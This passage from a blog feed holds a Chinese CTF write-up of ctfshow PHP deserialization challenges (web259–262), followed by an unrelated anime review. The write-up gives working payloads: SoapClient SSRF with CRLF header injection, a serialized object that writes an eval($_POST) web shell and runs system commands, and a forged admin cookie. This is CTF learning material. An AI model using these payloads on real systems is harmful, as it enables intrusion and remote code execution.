Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</li><li>SoapClient原生类<br>SoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。<br>soap的拓展的安装，直接打开php.ini，找到extension&#x3D;soap，然后把前面的注释去掉，再重启服务即可。</li><li>explode()函数<br>使用一个字符串分割另一个字符串<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">explode(string $separator, string $string, int $limit = PHP_INT_MAX): array</span><br><span class="line">此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 separator 作为边界点分割出来。</span><br></pre></td></tr></table></figure><a href="https://www.php.net/manual/zh/function.explode">官方文档</a></li><li>array_pop()函数<br>弹出数组最后一个单元（出栈）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array_pop(array &amp;$array): mixed</span><br><span class="line">array_pop() 弹出并返回 array 最后一个元素的值，并将 array 的长度减一。</span><br><span class="line">注意: 使用此函数后会重置（reset()）array 指针。</span><br></pre></td></tr></table></figure><a href="https://www.php.net/manual/zh/function.array-pop">官方文档</a></li></ul><p>要得到flag，必须本地访问flag.php而且带上token。因为本题有cloudfare代理，无法通过本地构造XFF头实现绕过。因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</p><ol start="2"><li>构造payload<br>首先脚本如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;Lxxx\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>location就是我们要访问的url，其中uri也是不可缺少的，但是其实没什么用。关键就是因为我们可以控制user_agent，所以可以CRLF注入。<br>因为Content-length的缘故，post只取到token&#x3D;ctfshow，其它不需要的部分被丢弃，实现了自己构造POST的请求包。<br>最后将得到的经过url编码后序列化字符串通过GET方式给变量vip，即构造payload为：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?vip=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>最后访问flag.txt，即可拿到flag。</li></ol><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET方式传入变量ctfshow，需要包含preg_match里的字符串</p></li><li><p>构造payload<br>直接构造为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure></li></ol><ul><li><p><code>__sleep()魔术方法</code><br>serialize() 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code> 。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 null 被序列化，并产生一个 E_NOTICE 级别的错误。<br><code>__sleep()</code> 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。使用 <code>__serialize()</code> 接口替代。<br><code>__sleep()</code> 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p></li><li><p><code>__wakeup()魔术方法</code><br>当使用 unserialize() 反序列化一个对象成功后，会自动调用该对象的 <code>__wakup()</code> 魔术方法。<br>该方法经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p></li><li><p><code>__unserialize()魔术方法</code><br>unserialize() 检查是否存在具有名为 <code>__unserialize()</code> 的魔术方法。此函数将会传递从 <code>__serialize()</code> 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。<br>注意:<br>如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略。<br>此特性自 PHP 7.4.0 起可用。</p></li><li><p><code>__invoke()魔术方法</code><br>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。</p></li></ul><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">魔术方法</a></p><p>由于源码中同时存在 <code>__wakeup()</code> 和 <code>__unserialize()</code> ，因此首先查看php版本。<br>在 <code>Response Headers</code> 中可以看到 <code>X-Powered-By: PHP/7.4.16</code> ，于是只有 <code>__unserialize()</code> 方法会生效。<br>由于源码中的 <code>__invoke()</code> 方法没有调用，因此这个方法实际无用。<br>变量code的值实际为变量username与变量password之和。<br>最终，我们选择 <code>file_put_contents()</code> 函数作为终点，构造出一个php页面进去代码执行即可。</p><ol start="2"><li>构造payload<br>根据弱类型比较（&#x3D;&#x3D;），877.php&#x3D;&#x3D;877。于是username构造为877.php，password构造为一句话木马。<br>由此写出脚本如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>由于其中含有php代码，所以可能在页面上显示不全，可以查看源码复制序列化字符串。<br>将得到的序列化字符串构造为payload:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?vip=O:10:&quot;ctfshowvip&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;877.php&quot;;s:8:&quot;password&quot;;s:28:&quot;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>payload执行后，访问877.php页面，同时POST传参cmd&#x3D;phpinfo();<br>成功显示php页面，则代表执行成功，可以进行命令执行了。<br>接下来POST传参cmd&#x3D;system(‘ls &#x2F;‘);<br>继续POST传参：cmd&#x3D;system(‘cat &#x2F;flag*’);<br>成功拿到flag。</li></ol><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><ol><li>查看源码<br>初始页面：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>message.php页面<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>通过初始页面的注释，我们发现了message.php页面。<br>通过比较两个页面可以发现，只需要将变量msg的值序列化为字符串就可以拿到flag了。</p><ol start="2"><li>构造payload<br>先写一个简洁的脚本：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">message</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>得到的字符串在message.php页面通过Cookie传入。<br>成功拿到flag。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;开始刷反序列化的题咯~&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>孤独摇滚--忐忑不安的吉他英雄</title>
    <link href="http://example.com/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/"/>
    <id>http://example.com/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</id>
    <published>2022-12-25T16:00:00.000Z</published>
    <updated>2022-12-27T06:47:08.945Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/band_2.png" alt="band"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p><h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p><h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p><ul><li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li><li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li><li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li></ul><h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p><h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p><h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p><p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p><p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p><h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/band_2.png&quot; alt=&quot;band&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="动画，孤独摇滚" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB%EF%BC%8C%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A/"/>
    
    
    <category term="孤独摇滚" scheme="http://example.com/tags/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A/"/>
    
  </entry>
  
  <entry>
    <title>自由</title>
    <link href="http://example.com/2022/12/25/Diary_1225/"/>
    <id>http://example.com/2022/12/25/Diary_1225/</id>
    <published>2022-12-24T16:00:00.000Z</published>
    <updated>2022-12-25T18:30:52.068Z</updated>
    
